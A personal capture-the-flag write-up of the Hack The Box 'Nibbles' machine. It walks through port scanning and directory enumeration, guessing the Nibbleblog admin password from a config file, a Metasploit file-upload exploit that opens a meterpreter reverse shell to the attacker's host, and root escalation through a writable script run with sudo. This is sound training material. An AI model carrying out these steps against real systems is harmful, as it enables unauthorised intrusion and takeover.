- - - 
created : 11-09-2025 

Tags : #easy 

Released on 13 Jan 2018
- - - 
# Recon
## Rustscan - Nmap

First we add the target IP to our /etc/hosts file, then we use [Rustscan](../../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Academy/Nibbles]
└─$ rustscan -a nibbles.htb -- -A   

Open 10.129.8.174:22
Open 10.129.8.174:80

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)

80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST

Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4

```
# Enumeration
## HTTP (80)

We can find comments in the [Source Code](../../../3%20-%20Tags/Hacking%20Concepts/Source%20Code.md):

```
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Academy/Nibbles]
└─$ curl http://nibbles.htb                                
<b>Hello world!</b>

<!-- /nibbleblog/ directory. Nothing interesting here! -
```

We can check the mentioned directory:

![Pasted image 20250911224746.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250911224746.png)
### Gobuster

We use [Gobuster](../../../3%20-%20Tags/Hacking%20Tools/Gobuster.md) to check for other directories:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Academy/Nibbles]
└─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -u  http://nibbles.htb/nibbleblog 

/.htaccess            (Status: 403) [Size: 306]
/.htpasswd            (Status: 403) [Size: 306]
/README               (Status: 200) [Size: 4628]
/admin                (Status: 301) [Size: 321] [--> http://nibbles.htb/nibbleblog/admin/]
/content              (Status: 301) [Size: 323] [--> http://nibbles.htb/nibbleblog/content/]
/languages            (Status: 301) [Size: 325] [--> http://nibbles.htb/nibbleblog/languages/]
/plugins              (Status: 301) [Size: 323] [--> http://nibbles.htb/nibbleblog/plugins/]
/themes               (Status: 301) [Size: 322] [--> http://nibbles.htb/nibbleblog/themes/]
```

We can check the `README` page for interesting information, such as the version number:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Academy/Nibbles]
└─$ curl http://nibbles.htb/nibbleblog/README                                                                                           
====== Nibbleblog ======
Version: v4.0.3
Codename: Coffee
Release date: 2014-04-01

Site: http://www.nibbleblog.com
Blog: http://blog.nibbleblog.com
Help & Support: http://forum.nibbleblog.com
Documentation: http://docs.nibbleblog.com

===== Social =====
* Twitter: http://twitter.com/nibbleblog
* Facebook: http://www.facebook.com/nibbleblog
* Google+: http://google.com/+nibbleblog

===== System Requirements =====
* PHP v5.2 or higher
* PHP module - DOM
* PHP module - SimpleXML
* PHP module - GD
* Directory “content” writable by Apache/PHP

Optionals requirements

* PHP module - Mcrypt

===== Installation guide =====
1- Download the last version from http://nibbleblog.com
2- Unzip the downloaded file
3- Upload all files to your hosting or local server via FTP, Shell, Cpanel, others.
4- With your browser, go to the URL of your web. Example: www.domain-name.com
5- Complete the form
6- Done! you have installed Nibbleblog

===== About the author =====
Name: Diego Najar
E-mail: dignajar@gmail.com
Linkedin: http://www.linkedin.com/in/dignajar

```
# Exploit
## Google Search

A quick Google search for "nibbleblog exploit" yields this [Nibbleblog File Upload Vulnerability](https://www.rapid7.com/db/modules/exploit/multi/http/nibbleblog_file_upload/). The flaw allows an authenticated attacker to upload and execute arbitrary [php](../../../3%20-%20Tags/Programming%20Languages/php.md) code on the underlying web server. The [Metasploit](../../../3%20-%20Tags/Hacking%20Tools/Metasploit.md) module in question works for version `4.0.3`. We know the exact version of `Nibbleblog` in use.
If we look at the source code of the [Metasploit](../../../3%20-%20Tags/Hacking%20Tools/Metasploit.md) module, we can see that the [Exploit](../../../3%20-%20Tags/Hacking%20Concepts/Exploit.md) uses user-supplied credentials to authenticate the admin portal at `/admin.php`.

Browsing to `nibbleblog/content` shows some interesting subdirectories `public`, `private`, and `tmp`. Digging around for a while, we find a `users.xml` file which at least seems to confirm the username is indeed admin. It also shows blacklisted IP addresses:

```xml
<users>
<user username="admin">
<id type="integer">0</id>
<session_fail_count type="integer">0</session_fail_count>
<session_date type="integer">1514544131</session_date>
</user>
<blacklist type="string" ip="10.10.10.1">
<date type="integer">1512964659</date>
<fail_count type="integer">1</fail_count>
</blacklist>
</users>
```

At this point, we have a valid username but no password. Searches of Nibbleblog related documentation show that the password is set during installation, and there is no known default password. Up to this point, have the following pieces of the puzzle:

- A Nibbleblog install potentially vulnerable to an authenticated file upload vulnerability
    
- An admin portal at `nibbleblog/admin.php`
    
- Directory listing which confirmed that `admin` is a valid username
    
- Login [Bruteforcing](../../../3%20-%20Tags/Hacking%20Concepts/Bruteforcing.md) protection blacklists our IP address after too many invalid login attempts. This takes login brute-forcing with a tool such as [Hydra](../../../3%20-%20Tags/Hacking%20Tools/Hydra.md) off the table

we find also a  `config.xml` file:

```xml
<config>
<name type="string">Nibbles</name>
<slogan type="string">Yum yum</slogan>
<footer type="string">Powered by Nibbleblog</footer>
<advanced_post_options type="integer">0</advanced_post_options>
<url type="string">http://10.10.10.134/nibbleblog/</url>
<path type="string">/nibbleblog/</path>
<items_rss type="integer">4</items_rss>
<items_page type="integer">6</items_page>
<language type="string">en_US</language>
<timezone type="string">UTC</timezone>
<timestamp_format type="string">%d %B, %Y</timestamp_format>
<locale type="string">en_US</locale>
<img_resize type="integer">1</img_resize>
<img_resize_width type="integer">1000</img_resize_width>
<img_resize_height type="integer">600</img_resize_height>
<img_resize_quality type="integer">100</img_resize_quality>
<img_resize_option type="string">auto</img_resize_option>
<img_thumbnail type="integer">1</img_thumbnail>
<img_thumbnail_width type="integer">190</img_thumbnail_width>
<img_thumbnail_height type="integer">190</img_thumbnail_height>
<img_thumbnail_quality type="integer">100</img_thumbnail_quality>
<img_thumbnail_option type="string">landscape</img_thumbnail_option>
<theme type="string">simpler</theme>
<notification_comments type="integer">1</notification_comments>
<notification_session_fail type="integer">0</notification_session_fail>
<notification_session_start type="integer">0</notification_session_start>
<notification_email_to type="string">admin@nibbles.com</notification_email_to>
<notification_email_from type="string">noreply@10.10.10.134</notification_email_from>
<seo_site_title type="string">Nibbles - Yum yum</seo_site_title>
<seo_site_description type="string"/>
<seo_keywords type="string"/>
<seo_robots type="string"/>
<seo_google_code type="string"/>
<seo_bing_code type="string"/>
<seo_author type="string"/>
<friendly_urls type="integer">0</friendly_urls>
<default_homepage type="integer">0</default_homepage>
</config>
```

We do see two mentions of `nibbles` in the site title as well as the notification e-mail address. This is also the name of the box. Could this be the admin password?
## Metasploit

Now we can use the [Exploit](../../../3%20-%20Tags/Hacking%20Concepts/Exploit.md):

```bash
msf > search nibbleblog
                                                                                                                                             
Matching Modules                                                                                                                             
================                                                                                                                             
                                                                                                                                             
   #  Name                                       Disclosure Date  Rank       Check  Description                                              
   -  ----                                       ---------------  ----       -----  -----------                                              
   0  exploit/multi/http/nibbleblog_file_upload  2015-09-01       excellent  Yes    Nibbleblog File Upload Vulnerability                     
                                                                                                                                             
                                                                                                                                             
Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/nibbleblog_file_upload                          
                                                                                                                                             
msf > use 0                                                                                                                                  
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp                                                                         
msf exploit(multi/http/nibbleblog_file_upload) > options

msf exploit(multi/http/nibbleblog_file_upload) > set lhost 10.10.14.115
lhost => 10.10.14.115
msf exploit(multi/http/nibbleblog_file_upload) > set lport 1337
lport => 1337
msf exploit(multi/http/nibbleblog_file_upload) > set rhost nibbles.htb
rhost => nibbles.htb
msf exploit(multi/http/nibbleblog_file_upload) > set targeturi /nibbleblog
targeturi => /nibbleblog/admin
msf exploit(multi/http/nibbleblog_file_upload) > set username admin
username => admin
msf exploit(multi/http/nibbleblog_file_upload) > set password nibbles
password => nibbles
msf exploit(multi/http/nibbleblog_file_upload) > run

[*] Started reverse TCP handler on 10.10.14.115:1337                                                                                         
[*] Sending stage (40004 bytes) to 10.129.8.174
[+] Deleted image.php
[*] Meterpreter session 1 opened (10.10.14.115:1337 -> 10.129.8.174:56120) at 2025-09-11 23:20:01 +0200

meterpreter > ls
Listing: /var/www/html/nibbleblog/content/private/plugins/my_image
==================================================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  258   fil   2025-09-11 23:19:57 +0200  db.xml

meterpreter > shell
meterpreter > shell
Process 1755 created.
Channel 2 created.

```

We can perform a transfer on `nc` and [Shell Stabilization](../../../3%20-%20Tags/Hacking%20Concepts/Shell%20Stabilization.md). 
# Privilege Escalation

Now that we have a reverse shell connection, it is time to escalate privileges. We can unzip the `personal.zip` file and see a file called `monitor.sh`:

```bash
unzip personal.zip
Archive:  personal.zip
   creating: personal/
   creating: personal/stuff/
  inflating: personal/stuff/monitor.sh  
  
  nibbler@Nibbles:/home/nibbler/personal/stuff$ cat m
cat monitor.sh 
                  ####################################################################################################
                  #                                        Tecmint_monitor.sh                                        #
                  # Written for Tecmint.com for the post www.tecmint.com/linux-server-health-monitoring-script/      #
                  # If any bug, report us in the link below                                                          #
                  # Free to use/edit/distribute the code below by                                                    #
                  # giving proper credit to Tecmint.com and Author                                                   #
                  #                                                                                                  #
                  ####################################################################################################
#! /bin/bash
# unset any variable which system may be using

# clear the screen
clear

unset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage

while getopts iv name
do
        case $name in
          i)iopt=1;;
          v)vopt=1;;
          *)echo "Invalid arg";;
        esac
done

if [[ ! -z $iopt ]]
then
{
wd=$(pwd)
basename "$(test -L "$0" && readlink "$0" || echo "$0")" > /tmp/scriptname
scriptname=$(echo -e -n $wd/ && cat /tmp/scriptname)
su -c "cp $scriptname /usr/bin/monitor" root && echo "Congratulations! Script Installed, now run monitor Command" || echo "Installation failed"
}
fi

if [[ ! -z $vopt ]]
then
{
echo -e "tecmint_monitor version 0.1\nDesigned by Tecmint.com\nReleased Under Apache 2.0 License"
}
fi

if [[ $# -eq 0 ]]
then
{


# Define Variable tecreset
tecreset=$(tput sgr0)

# Check if connected to Internet or not
ping -c 1 google.com &> /dev/null && echo -e '\E[32m'"Internet: $tecreset Connected" || echo -e '\E[32m'"Internet: $tecreset Disconnected"

# Check OS Type
os=$(uname -o)
echo -e '\E[32m'"Operating System Type :" $tecreset $os

# Check OS Release Version and Name
cat /etc/os-release | grep 'NAME\|VERSION' | grep -v 'VERSION_ID' | grep -v 'PRETTY_NAME' > /tmp/osrelease
echo -n -e '\E[32m'"OS Name :" $tecreset  && cat /tmp/osrelease | grep -v "VERSION" | cut -f2 -d\"
echo -n -e '\E[32m'"OS Version :" $tecreset && cat /tmp/osrelease | grep -v "NAME" | cut -f2 -d\"

# Check Architecture
architecture=$(uname -m)
echo -e '\E[32m'"Architecture :" $tecreset $architecture

# Check Kernel Release
kernelrelease=$(uname -r)
echo -e '\E[32m'"Kernel Release :" $tecreset $kernelrelease

# Check hostname
echo -e '\E[32m'"Hostname :" $tecreset $HOSTNAME

# Check Internal IP
internalip=$(hostname -I)
echo -e '\E[32m'"Internal IP :" $tecreset $internalip

# Check External IP
externalip=$(curl -s ipecho.net/plain;echo)
echo -e '\E[32m'"External IP : $tecreset "$externalip

# Check DNS
nameservers=$(cat /etc/resolv.conf | sed '1 d' | awk '{print $2}')
echo -e '\E[32m'"Name Servers :" $tecreset $nameservers 

# Check Logged In Users
who>/tmp/who
echo -e '\E[32m'"Logged In users :" $tecreset && cat /tmp/who 

# Check RAM and SWAP Usages
free -h | grep -v + > /tmp/ramcache
echo -e '\E[32m'"Ram Usages :" $tecreset
cat /tmp/ramcache | grep -v "Swap"
echo -e '\E[32m'"Swap Usages :" $tecreset
cat /tmp/ramcache | grep -v "Mem"

# Check Disk Usages
df -h| grep 'Filesystem\|/dev/sda*' > /tmp/diskusage
echo -e '\E[32m'"Disk Usages :" $tecreset 
cat /tmp/diskusage

# Check Load Average
loadaverage=$(top -n 1 -b | grep "load average:" | awk '{print $10 $11 $12}')
echo -e '\E[32m'"Load Average :" $tecreset $loadaverage

# Check System Uptime
tecuptime=$(uptime | awk '{print $3,$4}' | cut -f1 -d,)
echo -e '\E[32m'"System Uptime Days/(HH:MM) :" $tecreset $tecuptime

# Unset Variables
unset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage

# Remove Temporary Files
rm /tmp/osrelease /tmp/who /tmp/ramcache /tmp/diskusage
}
fi
shift $(($OPTIND -1))

```

The shell script `monitor.sh` is a monitoring script, and it is owned by our `nibbler` user and writeable.

```bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

The `nibbler` user can run the file `/home/nibbler/personal/stuff/monitor.sh` with root privileges. Being that we have full control over that file, if we append a reverse shell one-liner to the end of it and execute with `sudo` we should get a reverse shell back as the root user. Let us edit the `monitor.sh` file to append a root shell one-liner:

```bash
shift $(($OPTIND -1))

#! /bin/bash
```

If we cat the `monitor.sh` file, we will see the contents appended to the end. `It is crucial if we ever encounter a situation where we can leverage a writeable file for privilege escalation. We only append to the end of the file (after making a backup copy of the file) to avoid overwriting it and causing a disruption.` Execute the script with `sudo`:

```bash
$ sudo /home/nibbler/personal/stuff/ 

root@Nibbles:/home/nibbler/personal/stuff# cat /root/root.txt
de5e5d6619862a8aa5b9b212314e0cdd
```

Pwned!
